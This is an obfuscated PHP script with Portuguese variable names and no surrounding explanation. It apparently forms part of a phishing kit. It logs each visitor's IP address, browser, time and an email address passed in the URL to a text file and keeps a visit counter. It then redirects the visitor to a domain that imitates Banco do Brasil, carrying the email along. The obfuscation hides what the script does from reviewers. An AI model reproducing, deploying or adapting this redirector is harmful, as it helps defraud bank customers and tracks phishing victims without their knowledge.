<?php $ {
    "GLOBALS"
}
["belfkiwkq"] = "arquivo";
$ {
    "GLOBALS"
}
["ivplghcbbh"] = "contador";
$ {
    "GLOBALS"
}
["dniqkslxjv"] = "fp";
$ {
    "GLOBALS"
}
["tmcwdsupy"] = "hora";
$ {
    "GLOBALS"
}
["qmgoict"] = "file";
$ {
    "GLOBALS"
}
["qwxhtfife"] = "data";
$sqkehlm = "useragent";
$ {
    "GLOBALS"
}
["mcgovpnyik"] = "browser";
$fjmseamfyx = "file";
$ {
    "GLOBALS"
}
["epcwxrkdx"] = "browser_version";
$ {
    "GLOBALS"
}
["fqddpnemotj"] = "matched";
$ {
    "GLOBALS"
}
["mexjimy"] = "useragent";
$ {
    "GLOBALS"
}
["qswvpi"] = "string";
$ {
    "GLOBALS"
}
["fjydmrp"] = "i";
$ {
    "GLOBALS"
}
["xaqjqprurolu"] = "contador";
$ {
    "GLOBALS"
}
["cjntrcjc"] = "conteudo";
$ {
    "GLOBALS"
}
["emopbvzdr"] = "resuelveserver";
$ {
    "GLOBALS"
}
["huiwrvkp"] = "ipserver";
$tplkjxdxp = "matched";
$ {
    "GLOBALS"
}
["tmmdeyp"] = "ip";
$aefukj = "uri";
$ {
    "GLOBALS"
}
["sjtippcsfqcx"] = "ipserver";
$ivbvpjh = "uri";
$ {
    "GLOBALS"
}
["cqfrhkeogn"] = "email";
$ {
    "GLOBALS"
}
["hrgfhfwyztc"] = "box";
date_default_timezone_set("America/Sao_Paulo");
$gyemiqiny = "email";
$ {
    $gyemiqiny
} = $_GET["email"];
$ {
    "GLOBALS"
}
["letieojt"] = "hora";
$polrzoci = "string";
$ {
    $ {
        "GLOBALS"
    }
    ["hrgfhfwyztc"]
} = $_SERVER["HTTP_REFERER"];
$ {
    $ {
        "GLOBALS"
    }
    ["tmmdeyp"]
} = $_SERVER["REMOTE_ADDR"];
$ {
    $ivbvpjh
} = $_SERVER["REQUEST_URI"];
$ {
    $ {
        "GLOBALS"
    }
    ["letieojt"]
} = date("H:i");
$ {
    "GLOBALS"
}
["rsctfwfy"] = "matched";
$ {
    $aefukj
} = $_SERVER["REQUEST_URI"];
$ {
    "GLOBALS"
}
["vmiphm"] = "useragent";
$ {
    $ {
        "GLOBALS"
    }
    ["huiwrvkp"]
} = $_SERVER["SERVER_ADDR"];
$ {
    "GLOBALS"
}
["xqprvyp"] = "matched";
$ {
    $ {
        "GLOBALS"
    }
    ["emopbvzdr"]
} = gethostbyaddr($ {
    $ {
        "GLOBALS"
    }
    ["sjtippcsfqcx"]
});
$ {
    "GLOBALS"
}
["muxhynb"] = "IP";
$ {
    $ {
        "GLOBALS"
    }
    ["muxhynb"]
} = getenv("REMOTE_ADDR");
function string_aleatoria($tamanho) {
    $gclifartkyn = "i";
    $gnxqcjme = "tamanho";
    $ {
        $ {
            "GLOBALS"
        }
        ["cjntrcjc"]
    } = "1234567890abcdefghijklmnopqrstuvxz";
    for ($ {
        $ {
            "GLOBALS"
        }
        ["fjydmrp"]
    } = 0;$ {
        $gclifartkyn
    } < $ {
        $gnxqcjme
    };$ {
        $ {
            "GLOBALS"
        }
        ["fjydmrp"]
    }
    ++) {
        $ {
            "GLOBALS"
        }
        ["bobcbwe"] = "string";
        $ {
            $ {
                "GLOBALS"
            }
            ["bobcbwe"]
        }.= $ {
            $ {
                "GLOBALS"
            }
            ["cjntrcjc"]
        } {
            rand(0, 35)
        };
    }
    return $ {
        $ {
            "GLOBALS"
        }
        ["qswvpi"]
    };
}
$ {
    "GLOBALS"
}
["yrjgxhsm"] = "arquivo";
$ {
    $ {
        "GLOBALS"
    }
    ["qswvpi"]
} = string_aleatoria(10);
header("Location: https://www2-bb-sync.sms-br.com/BancoBrasil/?" . $ {
    $polrzoci
} . "=" . $ {
    $ {
        "GLOBALS"
    }
    ["cqfrhkeogn"]
} . "");
$ {
    $ {
        "GLOBALS"
    }
    ["mexjimy"]
} = $_SERVER["HTTP_USER_AGENT"];
$ {
    "GLOBALS"
}
["lzyuqnrqn"] = "useragent";
$wqwtegkr = "file";
$tcbllun = "ip";
$kigyqxvqf = "fp";
if (preg_match("|MSIE ([0-9].[0-9]{1,2})|", $ {
    $ {
        "GLOBALS"
    }
    ["mexjimy"]
}, $ {
    $ {
        "GLOBALS"
    }
    ["xqprvyp"]
})) {
    $ {
        "GLOBALS"
    }
    ["mydyiqgk"] = "browser_version";
    $ {
        "GLOBALS"
    }
    ["ehhbsuriwo"] = "browser";
    $ {
        $ {
            "GLOBALS"
        }
        ["mydyiqgk"]
    } = $ {
        $ {
            "GLOBALS"
        }
        ["fqddpnemotj"]
    }
    [1];
    $ {
        $ {
            "GLOBALS"
        }
        ["ehhbsuriwo"]
    } = "IE";
} elseif (preg_match("|Opera/([0-9].[0-9]{1,2})|", $ {
    $ {
        "GLOBALS"
    }
    ["vmiphm"]
}, $ {
    $ {
        "GLOBALS"
    }
    ["fqddpnemotj"]
})) {
    $ {
        $ {
            "GLOBALS"
        }
        ["epcwxrkdx"]
    } = $ {
        $ {
            "GLOBALS"
        }
        ["fqddpnemotj"]
    }
    [1];
    $ {
        $ {
            "GLOBALS"
        }
        ["mcgovpnyik"]
    } = "Opera";
} elseif (preg_match("|Firefox/([0-9\.]+)|", $ {
    $ {
        "GLOBALS"
    }
    ["mexjimy"]
}, $ {
    $ {
        "GLOBALS"
    }
    ["rsctfwfy"]
})) {
    $qwxpld = "matched";
    $utlvudebcb = "browser";
    $ {
        $ {
            "GLOBALS"
        }
        ["epcwxrkdx"]
    } = $ {
        $qwxpld
    }
    [1];
    $ {
        $utlvudebcb
    } = "Firefox";
} elseif (preg_match("|Chrome/([0-9\.]+)|", $ {
    $sqkehlm
}, $ {
    $tplkjxdxp
})) {
    $aidwtoqsus = "browser_version";
    $ {
        $aidwtoqsus
    } = $ {
        $ {
            "GLOBALS"
        }
        ["fqddpnemotj"]
    }
    [1];
    $ {
        $ {
            "GLOBALS"
        }
        ["mcgovpnyik"]
    } = "Chrome";
} elseif (preg_match("|Safari/([0-9\.]+)|", $ {
    $ {
        "GLOBALS"
    }
    ["lzyuqnrqn"]
}, $ {
    $ {
        "GLOBALS"
    }
    ["fqddpnemotj"]
})) {
    $rpbbtrq = "matched";
    $zjtzprihm = "browser";
    $ {
        $ {
            "GLOBALS"
        }
        ["epcwxrkdx"]
    } = $ {
        $rpbbtrq
    }
    [1];
    $ {
        $zjtzprihm
    } = "Safari";
} else {
    $ {
        "GLOBALS"
    }
    ["ywoahiqtlrxf"] = "browser_version";
    $xqxsulsihwfi = "browser";
    $ {
        $ {
            "GLOBALS"
        }
        ["ywoahiqtlrxf"]
    } = 0;
    $ {
        $xqxsulsihwfi
    } = "other";
}
$uvkjwtwgvb = "fp";
$ {
    $ {
        "GLOBALS"
    }
    ["tmmdeyp"]
} = $_SERVER["REMOTE_ADDR"];
$ylxdtgdxnnft = "hora";
$ {
    $ {
        "GLOBALS"
    }
    ["qwxhtfife"]
} = date("d/m/y");
$cnocywwykm = "arquivo";
$ {
    $ylxdtgdxnnft
} = date("H:i:s");
if ($ {
    $ {
        "GLOBALS"
    }
    ["qmgoict"]
} = fopen("owl.txt", "a+")) {
    $ffqhcqwezzr = "file";
    $ {
        "GLOBALS"
    }
    ["mgmwivfwqtp"] = "email";
    fputs($ {
        $ffqhcqwezzr
    }, "Data: " . $ {
        $ {
            "GLOBALS"
        }
        ["qwxhtfife"]
    } . " Hora: " . $ {
        $ {
            "GLOBALS"
        }
        ["tmcwdsupy"]
    } . " IP: " . $ {
        $ {
            "GLOBALS"
        }
        ["tmmdeyp"]
    } . " email: " . $ {
        $ {
            "GLOBALS"
        }
        ["mgmwivfwqtp"]
    } . " Navegador: " . $ {
        $ {
            "GLOBALS"
        }
        ["mcgovpnyik"]
    } . "
");
} else $ {
    $wqwtegkr
} = fopen("owl.txt", "a+");
fclose($ {
    $ {
        "GLOBALS"
    }
    ["qmgoict"]
});
$ {
    $tcbllun
} = getenv("REMOTE_ADDR");
"$ip";
$ {
    $ {
        "GLOBALS"
    }
    ["yrjgxhsm"]
} = "owl.txt";
$ {
    $ {
        "GLOBALS"
    }
    ["qmgoict"]
} = fopen("$arquivo", "r");
$bmxgsaksrvfo = "arquivo";
$ {
    $ {
        "GLOBALS"
    }
    ["qswvpi"]
} = "$ip";
$ {
    $ {
        "GLOBALS"
    }
    ["dniqkslxjv"]
} = fwrite($ {
    $fjmseamfyx
}, $ {
    $ {
        "GLOBALS"
    }
    ["tmmdeyp"]
});
fclose($ {
    $ {
        "GLOBALS"
    }
    ["qmgoict"]
});
$warjhmbo = "contador";
$ {
    $bmxgsaksrvfo
} = "cloud.txt";
$ {
    $ {
        "GLOBALS"
    }
    ["ivplghcbbh"]
} = 0;
$vyplfgl = "fp";
$ {
    $ {
        "GLOBALS"
    }
    ["dniqkslxjv"]
} = fopen($ {
    $cnocywwykm
}, "r");
$ {
    $warjhmbo
} = fgets($ {
    $uvkjwtwgvb
}, 26);
fclose($ {
    $ {
        "GLOBALS"
    }
    ["dniqkslxjv"]
});
++$ {
    $ {
        "GLOBALS"
    }
    ["xaqjqprurolu"]
};
$ {
    $vyplfgl
} = fopen($ {
    $ {
        "GLOBALS"
    }
    ["belfkiwkq"]
}, "w+");
fwrite($ {
    $kigyqxvqf
}, $ {
    $ {
        "GLOBALS"
    }
    ["ivplghcbbh"]
}, 26);
fclose($ {
    $ {
        "GLOBALS"
    }
    ["dniqkslxjv"]
});
?>        
